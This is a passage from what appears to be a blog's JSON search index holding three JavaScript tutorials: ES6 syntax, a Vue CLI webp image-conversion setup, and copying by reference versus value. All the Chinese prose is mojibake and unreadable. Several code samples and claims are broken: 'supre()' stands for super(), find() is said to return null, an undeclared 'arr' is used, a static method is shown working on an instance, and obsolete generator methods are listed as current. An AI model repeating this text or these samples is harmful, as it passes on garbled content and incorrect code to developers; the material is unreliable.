èˆ‡ await æˆ‘å€‘å°±å¯ä»¥æ“ºè„«éå»ä¸€å±¤å±¤ callback çš„æƒ¡å¤¢ï¼Œç¨‹å¼ç¢¼ä¹Ÿæ›´åŠ ç°¡æ½”ã€‚\nç°¡å¯«å±¬æ€§ åœ¨ ES5 ä¸­å¿…é ˆé€™éº¼å¯«ï¼š 1 2 3 4 5 6 function createCoord(x, y) { return { x: x, y: y } } åœ¨ ES6 ä»¥å¾Œå¯ä»¥é€™æ¨£ç°¡å¯«å±¬æ€§ï¼š 1 2 3 4 5 6 function createCoord(x, y) { return { x, y } } æ–¹æ³•å±¬æ€§ åœ¨ ES5 ä¸­å¿…é ˆé€™éº¼å¯«ï¼š 1 2 3 4 5 const math = { add: function(a, b) { return a + b; }, sub: function(a, b) { return a - b; }, multiply: function(a, b) { return a * b; } } åœ¨ ES6 ä»¥å¾Œå¯ä»¥é€™æ¨£ç°¡å¯«å±¬æ€§ï¼š 1 2 3 4 5 const math = { add(a, b) { return a + b; }, sub(a, b) { return a - b; }, multiply(a, b) { return a * b; } } é™£åˆ—æ–¹æ³• ES6 å¼•å…¥äº†è¨±å¤šæœ‰ç”¨çš„é™£åˆ—æ–¹æ³•ï¼Œä¾‹å¦‚ï¼š find()ï¼šæŸ¥æ‰¾é™£åˆ—ä¸­çš„æˆå“¡ï¼Œè¿”å› null è¡¨ç¤ºæ²’æ‰¾åˆ° findIndex()ï¼šæŸ¥æ‰¾é™£åˆ—æˆå“¡çš„ç´¢å¼• some()ï¼šæª¢æŸ¥æŸå€‹æ–·è¨€æ˜¯å¦è‡³å°‘ä¸€å€‹æˆå“¡åœ¨é™£åˆ—ä¸­ includesï¼šé™£åˆ—æ˜¯å¦åŒ…å«æŸé …ç›® 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 const array = [{ id: 1, checked: true }, { id: 2 }]; arr.find(item =\u0026gt; item.id === 2) // \u0026gt;\u0026gt;\u0026gt; { id: 2 } arr.findIndex(item =\u0026gt; item.id === 2) // \u0026gt;\u0026gt;\u0026gt; 1 arr.some(item =\u0026gt; item.checked) // \u0026gt;\u0026gt;\u0026gt; true const numberArray = [1,2,3,4]; numberArray.includes(2); // \u0026gt;\u0026gt;\u0026gt; true ES6 çš„ class ES6 æ”¯æŒ class èªæ³•ï¼Œä½†ä¸æ˜¯æ–°çš„å°è±¡ç¹¼æ‰¿æ¨¡å‹ï¼Œåªæ˜¯åŸå‹éŠçš„èªæ³•ç³–ã€‚ å‡½å¼ä¸­ä½¿ç”¨ static é—œéµå­—å®šç¾©æ§‹é€ å‡½å¼çš„æ–¹æ³•èˆ‡å±¬æ€§ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 class Student { constructor() { console.log(\u0026#34;I\u0026#39;m a student.\u0026#34;); } study() { console.log(\u0026#34;study!\u0026#34;); } static read() { console.log(\u0026#34;Reading Now.\u0026#34;); } } console.log(typeof Student); // \u0026gt;\u0026gt;\u0026gt; Function let stu = new Student(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a student.\u0026#34; stu.study(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;study!\u0026#34; stu.read(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;Reading Now.\u0026#34; class çš„ç¹¼æ‰¿(extends) extends å…è¨±ä¸€å€‹å­é¡ç¹¼æ‰¿çˆ¶é¡ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå­é¡çš„ constructor å‡½å¼ä¸­éœ€è¦åŸ·è¡Œ supre() å‡½å¼ã€‚ ç•¶ç„¶ä½ ä¹Ÿå¯ä»¥åœ¨å­é¡æ–¹æ³•ä¸­èª¿ç”¨çˆ¶é¡çš„æ–¹æ³•ï¼Œå¦‚ supre.parentMethodName()ã€‚ class çš„è²æ˜ä¸æœƒæå‡ hoisting ï¼Œå¦‚æœä½ è¦ä½¿ç”¨æŸå€‹ class ï¼Œé‚£ä½ å¿…é ˆåœ¨ä½¿ç”¨ä¹‹å‰å®šç¾©ä»–ï¼Œå¦å‰‡æœƒæ‹‹å‡º reference error çš„éŒ¯èª¤ã€‚ åœ¨ class ä¸­å®šç¾©å‡½å¼ä¸éœ€è¦ä½¿ç”¨ function é—œéµå­—ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 class Phone { constructor() { console.log(\u0026#34;I\u0026#39;m a phone.\u0026#34;); } } class MI extends Phone { constructor() { supre(); console.log(\u0026#34;I\u0026#39;m a phone designed by xiaomi.\u0026#34;); } } let mi8 = new MI(); // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a phone.\u0026#34; // \u0026gt;\u0026gt;\u0026gt; \u0026#34;I\u0026#39;m a phone designed by xiaomi.\u0026#34; class çš„ super æ–¹æ³• super é—œéµå­—è¢«ä½¿ç”¨æ–¼é€šéå‡½å¼å­˜å–çˆ¶å±¤ ã€è©³ç´° MDN æ–‡ä»¶ã€‘\nèªæ³• 1 2 super([arguments]); // calls the parent constructor. super.functionOnParent([arguments]); ç•¶ä½¿ç”¨å»ºæ§‹å­ï¼Œsuper é—œéµå­—å¿…é ˆå‡ºç¾åœ¨ this é—œéµå­—ä¹‹å‰ä½¿ç”¨ï¼Œsuper é—œéµå­—ä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨å‘¼å«å‡½å¼èˆ‡çˆ¶å°è±¡ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 let parent = { foo() { console.log(\u0026#34;Hello from the Parent\u0026#34;); } } let child = { foo() { super.foo(); console.log(\u0026#34;Hello from the Child\u0026#34;); } } Object.setPrototypeOf(child, parent); child.foo(); // \u0026gt;\u0026gt;\u0026gt; Hello from the Parent // \u0026gt;\u0026gt;\u0026gt; Hello from the Child éåŒæ­¥è™•ç†å·¥å…· - Generator(ç”Ÿæˆå™¨å‡½å¼) ç”Ÿæˆå™¨å‡½å¼ ç”Ÿæˆå™¨å°åƒæ˜¯ç”±ä¸€å€‹ generator function è¿”å›çš„,ä¸¦ä¸”å®ƒç¬¦åˆå¯è¿­ä»£å”è­°å’Œè¿­ä»£å™¨å”è­°ã€‚ ã€è©³ç´° MDN æ–‡ä»¶ã€‘\nèªæ³• 1 2 3 4 5 6 7 8 function* gen() { yield 1; yield 2; yield 3; } let g = gen(); // \u0026#34;Generator { }\u0026#34; æ–¹æ³• Generator.prototype.next()ï¼šè¿”å›ä¸€å€‹ç”± yieldè¡¨é”å¼ç”Ÿæˆçš„å€¼ã€‚ Generator.prototype.return()ï¼šè¿”å›çµ¦å®šçš„å€¼ä¸¦çµæŸç”Ÿæˆå™¨ã€‚ Generator.prototype.throw()ï¼šå‘ç”Ÿæˆå™¨æ‹‹å‡ºä¸€å€‹éŒ¯èª¤ã€‚ ç¯„ä¾‹ï¼šä¸€å€‹ç„¡é™è¿­ä»£å™¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function* idMaker() { let index = 0; while(true) yield index++; } let gen = idMaker(); // \u0026#34;Generator { }\u0026#34; console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 0 console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 1 console.log(gen.next().value); // \u0026gt;\u0026gt;\u0026gt; 2 // ... ç”Ÿæˆå™¨å°è±¡ Generator.prototype.next()ï¼šè¿”å› yield è¡¨é”å¼ç”Ÿæˆçš„å€¼ã€‚ Generator.prototype.close()ï¼šé—œé–‰ç”Ÿæˆå™¨ï¼Œå› æ­¤åŸ·è¡Œè©²å‡½å¼å¾Œèª¿ç”¨next()æ–¹æ³•æ™‚å°‡æœƒæ‹‹å‡º StopIteration éŒ¯èª¤ã€‚ Generator.prototype.send()ï¼šç”¨æ–¼å°‡å€¼ç™¼é€åˆ°ç”Ÿæˆå™¨ã€‚è©²å€¼ç”±yieldè¡¨é”å¼è¿”å›ï¼Œä¸¦ä¸”è¿”å›ä¸‹ä¸€å€‹yieldè¡¨é”å¼ç”Ÿæˆçš„å€¼ã€‚ Generator.prototype.throw()ï¼šå‘ç”Ÿæˆå™¨æ‹‹å‡ºéŒ¯èª¤ã€‚ ","date":"2022-08-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52276889089_0bb5aa46f7_o.png","permalink":"https://wayneblog.ga/2022-08-10/javascript-es6/","title":"Javascript ES6 ç‰¹æ€§"},{"content":" åƒè€ƒç¶²ç«™\nVue CLI å®˜æ–¹webpackç›¸é—œæ–‡æª”\nå‰è¨€ webp æ˜¯ 2010å¹´ Google é‡‹å‡ºçš„åœ–ç‰‡æ ¼å¼ï¼Œé‡å° PNG å¯æ¸›å°‘ 26%ï¼ŒJPEG ç´„å¯æ¸›å°‘ 25% ~ 34%ï¼Œç›®å‰åƒ… safariã€IE å°šä¸æ”¯æ´ï¼Œä½† safari åœ¨ ios 14 ä»¥å¾Œé–‹å§‹æ”¯æ´ã€‚ è‹¥åœ¨æœªæä¾› .webp æ ¼å¼åœ–æª”çš„æƒ…æ³ä¸‹ï¼Œä½¿ç”¨å¥—ä»¶æ–¼ webpack æ™‚é€²è¡Œåœ–ç‰‡è½‰æª”ï¼Œä½†æ–¼ development ä¸‹æœƒå› æŠ“ä¸åˆ°è™›æ“¬çš„ XXX.webp åœ–æª”è€Œå°è‡´ npm run èµ·æ™‚å™´éŒ¯ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹è¨­å®šè§£æ±ºæ­¤å•é¡Œã€‚ ä½¿ç”¨ webpack-plugin-image-transform-webp-and-mini å¥—ä»¶å°‡ image è½‰æª”æˆ webp æ ¼å¼ 1 npm i webpack-plugin-image-transform-webp-and-mini æ–°å¢ä¸€å€‹è‡ªè¨‚çš„ webploader æ­¤ loader åŠŸç”¨ç‚ºï¼šè‹¥ resource çš„ query (ä½¿ç”¨ chainWebpack æä¾›çš„è®Šæ•¸\u0026quot;resourceQuery\u0026ldquo;æŠ“) å­—ç¬¦ä¸­å«æœ‰ \u0026quot;type=webp\u0026quot; ä¸” resource ç‚ºåœ–ç‰‡æ™‚ï¼Œå°‡é™„æª”åè½‰æ›æˆ XXX.webp ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 const path = require(\u0026#34;path\u0026#34;) module.exports = function(source, map) { let result = source if (this.resourceQuery \u0026amp;\u0026amp; this.resourceQuery.includes(\u0026#34;type=webp\u0026#34;) \u0026amp;\u0026amp; !this.resource.includes(\u0026#34;data:image\u0026#34;)) { let extname = path.extname(this.resourcePath) result = source.replace(extname, \u0026#34;.webp\u0026#34;) } // return result this.callback(null, result, map) } chainWebpack è¨­å®š å¥—ä»¶å®‰è£å®Œæˆå¾Œï¼Œvue.config.js å¼•å…¥å¥—ä»¶ï¼Œä¸¦æŒ‡å®šwebpåœ–æª”å­˜æ”¾ä½ç½®ã€‚ å¼•å…¥è‡ªè¨‚çš„ webploader ï¼Œ ä¸¦è¨­å®š chainWebpack çš„ images éœ€å„ªå…ˆè·‘ webploaderï¼Œå†è·‘ url-loader èˆ‡ file-loaderã€‚ ä¸»è¦è§£æ±º Vue-cli çš„ development ä¸‹ï¼Œæœƒå› å¯¦éš›ä¸å­˜åœ¨ \u0026ldquo;XXX.webp\u0026rdquo; åœ–æª”è€Œå°è‡´é–‹ç™¼æ™‚å ±éŒ¯çš„å•é¡Œã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // ... const ImageminWebpWebpackPlugin = require(\u0026#34;webpack-plugin-image-transform-webp-and-mini\u0026#34;) // ... chainWebpack: config =\u0026gt; { // ... config.plugins.delete(\u0026#34;preload-index\u0026#34;) config.plugins.delete(\u0026#34;prefetch-index\u0026#34;) // ç›¸é—œè¨­å®šå»ºè­°æ”¾æ–¼ç§»é™¤ preload-index èˆ‡ prefetch-index ä¹‹å¾Œ config.plugin(\u0026#34;webP\u0026#34;).use(ImageminWebpWebpackPlugin, [ { name: \u0026#34;static/img/[name].[hash:8].[ext]\u0026#34;, logger: false, paths: { dir: path.resolve(__dirname, \u0026#34;./src/assets\u0026#34;), exclude: [] }, miniOptions: false } ]) let rule = config.module.rule(\u0026#34;images\u0026#34;) rule.uses.clear() rule .use(\u0026#34;./webploader.js\u0026#34;) .loader(\u0026#34;./webploader.js\u0026#34;) .end() .use(\u0026#34;url-loader\u0026#34;) .loader(\u0026#34;url-loader\u0026#34;) .options({ limit: 4096, fallback: { loader: \u0026#34;file-loader\u0026#34;, options: { name: \u0026#34;static/img/[name].[hash:8].[ext]\u0026#34; } } }) // ... } è£œä¸Šæ˜¯å¦æ”¯æ´ Webp çš„åˆ¤æ–·ï¼Œè‹¥æ”¯æ´å‰‡æ–¼ \u0026lt;html\u0026gt; è£œä¸Š class nameï¼Œä¾›CSSæŠ“å– class name å¾Œæ”¹è®€ webp åœ–ç‰‡ main.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 async function isSupportWebp() { return new Promise(resolve =\u0026gt; { let result = false const elem = document.createElement(\u0026#34;canvas\u0026#34;) if (elem.getContext \u0026amp;\u0026amp; elem.getContext(\u0026#34;2d\u0026#34;)) { result = elem.toDataURL(\u0026#34;image/webp\u0026#34;).indexOf(\u0026#34;data:image/webp\u0026#34;) === 0 } resolve(result) }) } // ä½¿ç”¨è‡ªå®šä¹‰è¿‡æ»¤å™¨ filter(Vue) ;(async () =\u0026gt; { Vue.prototype.$supportWebp = await isSupportWebp() if (Vue.prototype.$supportWebp) { document.documentElement.classList.add(\u0026#34;webp\u0026#34;) } })() è‹¥æœ‰ä½¿ç”¨ vue-lazyloadï¼Œå‰‡è£œä¸Š vue-lazyload æä¾›çš„ webp ç›¸é—œè¨­å®š \u0026lt;img\u0026gt; ä½¿ç”¨ v-lazy æ™‚ï¼Œsrcçš„åœ–ç‰‡é™„æª”åçš†æœƒè½‰æ›æˆ XXX.webp 1 2 3 4 5 6 7 8 9 10 vue.use(VueLazyload, { filter: { webp(listener) { if (vue.prototype.$supportWebp \u0026amp;\u0026amp; !~listener.src.indexOf(\u0026#34;.webp\u0026#34;)) { listener.src = listener.src.replace(/\\.(png|jpe?g)(\\?.*)?$/, \u0026#34;.webp\u0026#34;) listener.el.setAttribute(\u0026#34;data-src\u0026#34;, listener.src.replace(/\\.(png|jpe?g)(\\?.*)?$/, \u0026#34;.webp\u0026#34;)) } } } }) æ–¼å„å€‹ CSS ä¸­ï¼Œè‹¥ background ä½¿ç”¨åˆ°éœ€è½‰ .webp æ ¼å¼çš„ img ï¼Œè£œä¸Šè‡ªè¡Œè¨­å®šçš„ query (\u0026quot;?type=webp\u0026quot;)ï¼Œä»¥ä¾¿ webploader æŠ“è©² query é€²è¡Œè½‰æ›åœ–æª”æ ¼å¼ ä¾‹å¦‚ï¼š 1 2 3 4 5 6 7 8 9 10 .page-wrap-main { background: url(\u0026#34;~assets/images/main/bg.png\u0026#34;); background-size: cover; width: 100%; position: relative; .webp \u0026amp; { background-image: url(\u0026#34;~assets/images/main/bg.png?type=webp\u0026#34;); } } ","date":"2022-08-10T00:00:00Z","image":"https://live.staticflickr.com/65535/52282467469_7cf86509a9_o.jpg","permalink":"https://wayneblog.ga/2022-08-10/vue-cli-use-webp/","title":"Vue-cli pluginï¼šä½¿ç”¨å¥—ä»¶å°‡åœ–ç‰‡è‡ªå‹•è½‰æª”ç‚ºwebpæ ¼å¼"},{"content":" åƒè€ƒç¶²ç«™\nJavaScriptçš„è¨˜æ†¶é«”ç©ºé–“ åœ¨ JavaScript ä¸­ï¼Œæ¯ä¸€å€‹æ•¸æ“šéƒ½éœ€è¦ä¸€å€‹è¨˜æ†¶é«”ç©ºé–“ã€‚è¨˜æ†¶é«”ç©ºé–“åˆ†ç‚ºå…©ç¨®ï¼Œæ£§è¨˜æ†¶é«”ï¼ˆstockï¼‰ èˆ‡ å †è¨˜æ†¶é«”ï¼ˆheapï¼‰ã€‚ æ£§æ˜¯ç³»çµ±è‡ªå‹•åˆ†é…çš„è¨˜æ†¶é«”ç©ºé–“ï¼Œç”±ç³»çµ±è‡ªå‹•é‡‹æ”¾ï¼Œå †å‰‡æ˜¯å‹•æ…‹åˆ†é…çš„è¨˜æ†¶é«”ï¼Œå¤§å°ä¸å®šä¸æœƒè‡ªå‹•é‡‹æ”¾ã€‚ åŸºç¤è³‡æ–™å‹åˆ¥ JavaScript ä¸­çš„åŸºç¤è³‡æ–™å‹åˆ¥ï¼Œé€™äº›å€¼éƒ½æœ‰å›ºå®šçš„å¤§å°ï¼Œå„²å­˜åœ¨ æ£§è¨˜æ†¶é«”ä¸­ï¼Œç”±ç³»çµ±è‡ªå‹•åˆ†é…å„²å­˜ç©ºé–“ï¼Œåœ¨æ£§è¨˜æ†¶é«”ç©ºé–“çš„å€¼ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥é€²è¡Œæ“ä½œï¼Œå› æ­¤åŸºç¤è³‡æ–™å‹åˆ¥éƒ½æ˜¯æŒ‰ç…§å€¼è¨ªå•ã€‚ åœ¨æ£§è¨˜æ†¶é«”ä¸­çš„è³‡æ–™ç™¼ç”Ÿè¤‡è£½çš„è¡Œç‚ºæ™‚ï¼Œç³»çµ±æœƒè‡ªå‹•ç‚ºæ–°è®Šæ•¸é–‹é—¢ä¸€å€‹æ–°çš„è¨˜æ†¶é«”ç©ºé–“ï¼Œç•¶è¤‡è£½åŸ·è¡Œå¾Œï¼Œå…©å€‹è¨˜æ†¶é«”ç©ºé–“çš„å€¼å°±äº’ä¸å½±éŸ¿ï¼Œæ”¹è®Šå…¶ä¸­ä¸€å€‹ä¸æœƒå½±éŸ¿å¦ä¸€å€‹ æ£§è¨˜æ†¶é«”ç©ºé–“è³‡æ–™è¤‡è£½ç¤ºä¾‹ 1 2 3 4 5 6 var a = `I am variable a`; var b = a; console.log(b); //`I am variable a` b = `I am variable b`; console.log(a); //`I am variable a` console.log(b); //`I am variable b` å¼•ç”¨è³‡æ–™å‹åˆ¥ å¼•ç”¨å‹åˆ¥çš„å€¼æ˜¯å„²å­˜åœ¨ å †è¨˜æ†¶é«”ä¸­çš„ç‰©ä»¶ï¼Œåœ¨ JavaScript ä¸­æˆ‘å€‘ä¸èƒ½ç›´æ¥æ“ä½œç‰©ä»¶çš„å †è¨˜æ†¶é«”ç©ºé–“ã€‚å› ç‚ºå¼•ç”¨å‹åˆ¥çš„å€¼éƒ½æ˜¯æŒ‰å¼•ç”¨è¨ªå•çš„ï¼Œæ‰€ä»¥åœ¨æ“ä½œç‰©ä»¶æ™‚ï¼Œå¯¦éš›ä¸Šæ˜¯æ“ä½œç‰©ä»¶çš„å¼•ç”¨è€Œä¸æ˜¯å¯¦éš›çš„ç‰©ä»¶ã€‚ å¼•ç”¨å¯ä»¥ç†è§£ç‚ºå„²å­˜åœ¨æ£§è¨˜æ†¶é«”ä¸­çš„ä¸€å€‹åœ°å€ï¼Œè©²åœ°å€æŒ‡å‘å †è¨˜æ†¶é«”ä¸­çš„ä¸€å€‹å¯¦éš›ç‰©ä»¶ã€‚ å¼•ç”¨å‹åˆ¥å€¼çš„è¤‡è£½ï¼Œç³»çµ±æœƒç‚ºæ–°çš„è®Šæ•¸è‡ªå‹•åˆ†é…ä¸€å€‹æ–°çš„æ£§è¨˜æ†¶é«”ç©ºé–“ é€™å€‹æ£§è¨˜æ†¶é«”ç©ºé–“ï¼Œå„²å­˜è‘—èˆ‡è¢«è¤‡åˆ¶è®Šé‡ç›¸åŒçš„æŒ‡æ¨™ï¼Œå„˜ç®¡ä»–å€‘åœ¨æ£§è¨˜æ†¶é«”ä¸­çš„è¨˜æ†¶é«”ç©ºé–“çš„ä½ç½®äº’ç›¸ç¨ç«‹ï¼Œä½†æ˜¯åœ¨å †è¨˜æ†¶é«”ä¸­è¨ªå•åˆ°çš„ç‰©ä»¶å¯¦éš›ä¸Šæ˜¯åŒä¸€å€‹ï¼Œå› æ­¤ç•¶æˆ‘å€‘æ”¹è®Šå…¶ä¸­ä¸€å€‹ç‰©ä»¶çš„å€¼æ™‚ï¼Œå¯¦éš›ä¸Šå°±æ˜¯æ”¹è®ŠåŸä¾†çš„ç‰©ä»¶ã€‚ æ£§è¨˜æ†¶é«”ç©ºé–“å„²å­˜æŒ‡æ¨™ï¼ˆåœ°å€ï¼‰ï¼Œå †è¨˜æ†¶é«”ç©ºé–“å„²å­˜å¯¦éš›çš„ç‰©ä»¶ï¼Œæˆ‘å€‘é€šéè®Šæ•¸è¨ªå•ç‰©ä»¶æ™‚ï¼Œå¯¦éš›ä¸Šè¨ªå•çš„æ˜¯ç‰©ä»¶çš„å¼•ç”¨ï¼ˆåœ°å€ï¼‰ã€‚ è¨˜æ†¶é«”ä¸­çš„æ£§å€åŸŸå­˜æ”¾è®Šæ•¸ï¼ˆåŸºæœ¬å‹åˆ¥çš„è®Šæ•¸åŒ…æ‹¬è®Šæ•¸å®£å‘Šå’Œå€¼ï¼‰ä»¥åŠæŒ‡å‘å †å€åŸŸå„²å­˜ä½ç½®çš„æŒ‡æ¨™ï¼ˆå¼•ç”¨å‹åˆ¥çš„è®Šæ•¸åŒ…æ‹¬è®Šæ•¸å®£å‘Šå’ŒæŒ‡å‘å…§å®¹çš„æŒ‡æ¨™ï¼‰ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var a = { name : `I am object a`, type : \u0026#39;object\u0026#39; } var b = a; console.log(b); // {name: \u0026#34;I am object a\u0026#34;, type: \u0026#34;object\u0026#34;} b.name = `I am object b`; console.log(a); // {name: \u0026#34;I am object b\u0026#34;, type: \u0026#34;object\u0026#34;} console.log(b); // {name: \u0026#34;I am object b\u0026#34;, type: \u0026#34;object\u0026#34;} åŸºæœ¬å‹åˆ¥ç¸½çµ åŸºæœ¬è³‡æ–™å‹åˆ¥ï¼š åŸºæœ¬è³‡æ–™å‹åˆ¥ åŒ…æ‹¬ nullã€undefinedã€numberã€stringã€booleanã€symbol(es6) å­˜æ”¾ä½ç½® è¨˜æ†¶é«”ä¸­çš„æ£§å€åŸŸä¸­ æ¯”è¼ƒ å€¼çš„æ¯”è¼ƒï¼Œåˆ¤æ–·æ˜¯å¦ç›¸ç­‰ï¼Œå¦‚æœå€¼ç›¸ç­‰ï¼Œå°±ç›¸ç­‰ã€‚ä¸€èˆ¬ä½¿ç”¨ === é€²è¡Œæ¯”è¼ƒï¼Œå› ç‚º == æœƒé€²è¡Œå‹åˆ¥çš„è½‰æ› æ‹·è² è³¦å€¼ï¼ˆé€šé = è³¦å€¼æ“ä½œç¬¦ä¾†è³¦å€¼ï¼‰ï¼Œå…©å€‹è®Šæ•¸çš„å€¼ä¹‹é–“ç›¸äº’æ²’æœ‰å½±éŸ¿ å¼•ç”¨å‹åˆ¥ç¸½çµ åŒ…æ‹¬ é™£åˆ—ã€ç‰©ä»¶ã€å‡½å¼ å­˜æ”¾ä½ç½® è¨˜æ†¶é«”çš„æ£§å€åŸŸä¸­å­˜æ”¾è®Šæ•¸å’ŒæŒ‡æ¨™ï¼Œå †å€åŸŸå„²å­˜å¯¦éš›çš„ç‰©ä»¶ æ¯”è¼ƒ æ˜¯å¼•ç”¨çš„æ¯”è¼ƒï¼ˆå°±æ˜¯åœ°å€çš„æ¯”è¼ƒï¼Œè®Šæ•¸åœ¨æ£§è¨˜æ†¶é«”ä¸­å°æ‡‰çš„æŒ‡æ¨™åœ°å€ç›¸ç­‰å°±æŒ‡å‘åŒä¸€å€‹ç‰©ä»¶ï¼‰åˆ¤æ–·æ˜¯å¦ç‚ºåŒä¸€å€‹ç‰©ä»¶ï¼Œç¤ºä¾‹å¦‚ä¸‹ è®Šæ•¸aå’Œè®Šæ•¸bçš„å¼•ç”¨ä¸åŒï¼Œç‰©ä»¶å°±ä¸æ˜¯åŒä¸€å€‹ç‰©ä»¶ 1 2 3 var a = {name:\u0026#39;Jay\u0026#39;}; var b = {name:\u0026#39;Jay\u0026#39;}; a===b //false æˆ‘å€‘å°JavaScriptä¸­å¼•ç”¨å‹åˆ¥é€²è¡Œæ“ä½œçš„æ™‚å€™ï¼Œéƒ½æ˜¯æ“ä½œå…¶ç‰©ä»¶çš„å¼•ç”¨ï¼ˆå„²å­˜åœ¨æ£§è¨˜æ†¶é«”ä¸­çš„æŒ‡æ¨™ï¼‰ è³¦å€¼ã€æ·±æ‹·è²å’Œæ·ºæ‹·è² (Assignment, deep copy and shallow copy) è³¦å€¼ï¼šå…©å€‹è®Šæ•¸çš„éƒ½æŒ‡å‘åŒä¸€å€‹ç‰©ä»¶ï¼Œæ”¹è®Šå…¶ä¸­ä¸€å€‹ï¼Œå¦ä¸€å€‹ä¹Ÿæœƒå—åˆ°å½±éŸ¿ã€‚ æ‰€è¬‚æ‹·è²å°±æ˜¯è¤‡è£½ï¼Œé€šéè¤‡è£½åŸç‰©ä»¶ç”Ÿæˆä¸€å€‹æ–°çš„ç‰©ä»¶ã€‚ æ·ºæ‹·è² é‡æ–°åœ¨å †è¨˜æ†¶é«”ä¸­é–‹é—¢ä¸€å€‹ç©ºé–“ï¼Œæ‹·è²å¾Œæ–°ç‰©ä»¶ç²å¾—ä¸€å€‹ç¨ç«‹çš„åŸºæœ¬è³‡æ–™å‹åˆ¥ è³‡æ–™ï¼Œå’ŒåŸç‰©ä»¶å…±ç”¨ä¸€å€‹åŸç‰©ä»¶å…§çš„å¼•ç”¨å‹åˆ¥ è³‡æ–™ï¼Œæ”¹è®ŠåŸºæœ¬å‹åˆ¥ è³‡æ–™ï¼Œå…©å€‹ç‰©ä»¶äº’ä¸å½±éŸ¿ï¼Œæ”¹è®Šå…¶ä¸­ä¸€å€‹ç‰©ä»¶å…§çš„å¼•ç”¨å‹åˆ¥ è³‡æ–™ï¼Œå¦ä¸€å€‹ç‰©ä»¶æœƒå—åˆ°å½±éŸ¿ã€‚ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 var obj = { name: \u0026#39;Jay Chou\u0026#39;, age: 32, song:{ name:\u0026#39;ç™¼å¦‚é›ª\u0026#39;, year:2007 } } var obj1 = obj; function shallowCopy(obj){ var scObj = {}; for(var prop in obj){ if(obj.hasOwnProperty(prop)){ scObj[prop] = obj[prop] } } return scObj; } var obj2 = shallowCopy(obj); console.log(obj === obj1,\u0026#39;obj === obj1\u0026#39;,\u0026#39;è³¦å€¼\u0026#39;); console.log(obj === obj2,\u0026#39;obj === obj2\u0026#39;,\u0026#39;æ·ºæ‹·è²\u0026#39;); // true \u0026#34;obj === obj1\u0026#34; \u0026#34;è³¦å€¼\u0026#34; // false \u0026#34;obj === obj2\u0026#34; \u0026#34;æ·ºæ‹·è²\u0026#34; console.log(obj.song === obj2.song); //true obj2.song.name=\u0026#39;é›™æˆªæ£\u0026#39;; obj2.name=\u0026#39;Jay\u0026#39;; console.log(obj) // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;é›™æˆªæ£\u0026#39;,year:2007}} console.log(obj1); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;é›™æˆªæ£\u0026#39;,year:2007}} console.log(obj2); {name: \u0026#34;Jay\u0026#34;, age: 32, song: {name:\u0026#39;é›™æˆªæ£\u0026#39;,year:2007}} console.log(obj===obj1) //true console.log(obj===obj2) //false æ·±æ‹·è² ä¸è«–æ˜¯ç‰©ä»¶å…§çš„åŸºæœ¬å‹åˆ¥é‚„æ˜¯å¼•ç”¨å‹åˆ¥ éƒ½è¢«å®Œå…¨æ‹·è²,æ‹·è²å¾Œå…©å€‹ç‰©ä»¶äº’ä¸å½±éŸ¿ã€‚ ä¸€ç¨®æ¯”è¼ƒç°¡å–®å¯¦ç¾æ–¹æ³•æ˜¯ä½¿ç”¨ var dcObj = JSON.parse(JSON.stringify(obj)) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 var obj = { name: \u0026#39;Jay Chou\u0026#39;, age: 32, song:{ name:\u0026#39;ç™¼å¦‚é›ª\u0026#39;, year:2007 } } var dcObj=JSON.parse(JSON.stringify(obj)); console.log(dcObj); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;ç™¼å¦‚é›ª\u0026#39;,year:2007}} console.log(dcObj.song === obj.song); //false dcObj.name=\u0026#39;Jay\u0026#39;; dcObj.song.name=\u0026#39;é›™æˆªæ£\u0026#39;; console.log(obj); // {name: \u0026#34;Jay Chou\u0026#34;, age: 32, song: {name:\u0026#39;ç™¼å¦‚é›ª\u0026#39;,year:2007}} console.log(dcObj); //{name: \u0026#34;Jay\u0026#34;, age: 32, song: {name:\u0026#39;é›™æˆªæ£\u0026#39;,year:2007}} æ¯”è¼ƒï¼šè³¦å€¼ã€æ·±æ‹·è²ã€æ·ºæ‹·è²ï¼š è³¦å€¼ æ–°ç‰©ä»¶ä»ç„¶æŒ‡å‘åŸç‰©ä»¶ï¼Œæ”¹è®Šæ–°ç‰©ä»¶çš„åŸºæœ¬å‹åˆ¥å’Œå¼•ç”¨å‹åˆ¥çš„å€¼éƒ½æœƒä½¿åŸç‰©ä»¶å°æ‡‰çš„å€¼ä¸€åŒæ”¹è®Šã€‚ æ·ºæ‹·è² 